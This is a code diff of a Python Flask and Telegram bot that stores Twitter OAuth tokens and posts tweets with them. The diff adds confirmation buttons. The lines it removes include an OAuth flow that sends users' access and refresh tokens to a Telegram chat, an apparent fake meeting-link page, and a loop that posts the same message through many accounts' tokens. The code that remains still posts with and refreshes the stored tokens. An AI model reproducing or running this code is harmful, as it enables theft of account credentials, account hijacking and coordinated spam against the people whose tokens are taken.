@@ -136,21 +136,35 @@ def handle_button(update, context):
     query.answer()
 
     if query.data == 'refresh_all':
-        query.edit_message_text(text="Refreshing all tokens...")
-        refresh_all_tokens()
+        query.edit_message_text(text="Confirm refreshing all tokens?", reply_markup=InlineKeyboardMarkup([
+            [InlineKeyboardButton("Yes", callback_data='confirm_refresh')],
+            [InlineKeyboardButton("No", callback_data='main_menu')]
+        ]))
     elif query.data == 'post_single':
         query.edit_message_text(text="Posting with a single token. Please enter your message:")
         context.user_data['post_mode'] = 'single'
     elif query.data == 'post_bulk':
         query.edit_message_text(text="Enter the number of tokens to use for posting:")
         context.user_data['post_mode'] = 'bulk'
+    elif query.data == 'confirm_refresh':
+        refresh_all_tokens()
+    elif query.data == 'confirm_post':
+        message = context.user_data.get('message_content')
+        post_with_single_token(message)
+    elif query.data == 'main_menu':
+        send_automation_startup_message()
 
 def handle_message(update, context):
     user_message = update.message.text
     post_mode = context.user_data.get('post_mode')
 
     if post_mode == 'single':
-        post_with_single_token(user_message)
+        context.user_data['message_content'] = user_message
+        update.message.reply_text("Confirm posting the following message?",
+                                  reply_markup=InlineKeyboardMarkup([
+                                      [InlineKeyboardButton("Yes", callback_data='confirm_post')],
+                                      [InlineKeyboardButton("No", callback_data='main_menu')]
+                                  ]))
     elif post_mode == 'bulk':
         try:
             num_tokens = int(user_message)
@@ -167,7 +181,10 @@ def refresh_all_tokens():
         new_refresh_token = refresh_token
         save_tokens_to_file(new_access_token, new_refresh_token)
         refreshed_count += 1
-    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.")
+    automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"Refreshed {refreshed_count} tokens.",
+                                reply_markup=InlineKeyboardMarkup([
+                                    [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
+                                ]))
 
 def post_tweet(access_token, tweet_text):
     TWITTER_API_URL = "https://api.twitter.com/2/tweets"
@@ -190,131 +207,27 @@ def post_with_single_token(message):
     if tokens:
         access_token, _ = tokens[0]
         result = post_tweet(access_token, message)
-        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"{result}")
+        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"{result}",
+                                    reply_markup=InlineKeyboardMarkup([
+                                        [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
+                                    ]))
     else:
-        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text="No tokens available.")
-
-def post_with_bulk_tokens(message, num_tokens):
-    tokens = load_tokens()
-    if tokens and num_tokens <= len(tokens):
-        for i in range(num_tokens):
-            access_token, _ = tokens[i]
-            result = post_tweet(access_token, message)
-            automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text=f"{result}")
-            time.sleep(5)
-    else:
-        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text="Not enough tokens available.")
+        automation_bot.send_message(chat_id=AUTOMATION_CHAT_ID, text="No tokens available.",
+                                    reply_markup=InlineKeyboardMarkup([
+                                        [InlineKeyboardButton("Back to Main Menu", callback_data='main_menu')]
+                                    ]))
 
 # Set up command handlers for automation bot
 automation_dispatcher.add_handler(CommandHandler('start', start_automation))
 automation_dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
 automation_dispatcher.add_handler(CallbackQueryHandler(handle_button))
 
-# Flask Routes for OAuth and Token Management
-@app.route('/tweet/<access_token>', methods=['GET', 'POST'])
-def tweet(access_token):
-    if request.method == 'POST':
-        tweet_text = request.form['tweet_text']
-        result = post_tweet(access_token, tweet_text)
-        return render_template('tweet_result.html', result=result)
-
-    return render_template('tweet_form.html', access_token=access_token)
-
-@app.route('/refresh/<refresh_token2>', methods=['GET'])
-def refresh_page(refresh_token2):
-    return render_template('refresh.html', refresh_token=refresh_token2)
-
-@app.route('/refresh/<refresh_token>/perform', methods=['POST'])
-def perform_refresh(refresh_token):
-    token_url = 'https://api.twitter.com/2/oauth2/token'
-    client_credentials = f"{CLIENT_ID}:{CLIENT_SECRET}"
-    auth_header = base64.b64encode(client_credentials.encode()).decode('utf-8')
-
-    headers = {
-        'Authorization': f'Basic {auth_header}',
-        'Content-Type': 'application/x-www-form-urlencoded'
-    }
-
-    data = {
-        'refresh_token': refresh_token,
-        'grant_type': 'refresh_token',
-        'client_id': CLIENT_ID
-    }
-
-    response = requests.post(token_url, headers=headers, data=data)
-    token_response = response.json()
-
-    if response.status_code == 200:
-        new_access_token = token_response.get('access_token')
-        new_refresh_token = token_response.get('refresh_token')
-        send_to_telegram(new_access_token, new_refresh_token)
-        return f"New Access Token: {new_access_token}, New Refresh Token: {new_refresh_token}", 200
-    else:
-        error_description = token_response.get('error_description', 'Unknown error')
-        error_code = token_response.get('error', 'No error code')
-        return f"Error refreshing token: {error_description} (Code: {error_code})", response.status_code
-
-@app.route('/j')
-def meeting():
-    state_id = request.args.get('meeting')
-    code_ch = request.args.get('pwd')
-    return render_template('meeting.html', state_id=state_id, code_ch=code_ch)
-
+# Flask route
 @app.route('/')
 def home():
-    code = request.args.get('code')
-    state = request.args.get('state')
-    error = request.args.get('error')
+    return "Server is running!"
 
-    if not code:
-        state = "0"
-        session['oauth_state'] = state
-
-        code_verifier, code_challenge = generate_code_verifier_and_challenge()
-        session['code_verifier'] = code_verifier
-
-        authorization_url = (
-            f"https://twitter.com/i/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&"
-            f"redirect_uri={CALLBACK_URL}&scope=tweet.read%20tweet.write%20users.read%20offline.access&"
-            f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
-        )
-
-        return redirect(authorization_url)
-
-    if code:
-        if error:
-            return f"Error during authorization: {error}", 400
-
-        if state != "0":
-            return "Invalid state parameter", 403
-
-        code_verifier = session.pop('code_verifier', None)
-
-        token_url = "https://api.twitter.com/2/oauth2/token"
-        data = {
-            'grant_type': 'authorization_code',
-            'code': code,
-            'redirect_uri': CALLBACK_URL,
-            'code_verifier': code_verifier
-        }
-
-        response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
-        token_response = response.json()
-
-        if response.status_code == 200:
-            access_token = token_response.get('access_token')
-            refresh_token = token_response.get('refresh_token')
-
-            session['access_token'] = access_token
-            session['refresh_token'] = refresh_token
-
-            send_to_telegram(access_token, refresh_token)
-            return f"Access Token: {access_token}, Refresh Token: {refresh_token}"
-        else:
-            error_description = token_response.get('error_description', 'Unknown error')
-            error_code = token_response.get('error', 'No error code')
-            return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
-
+# Run the bots
 if __name__ == '__main__':
     port = int(os.environ.get("PORT", 5000))
     send_startup_message()
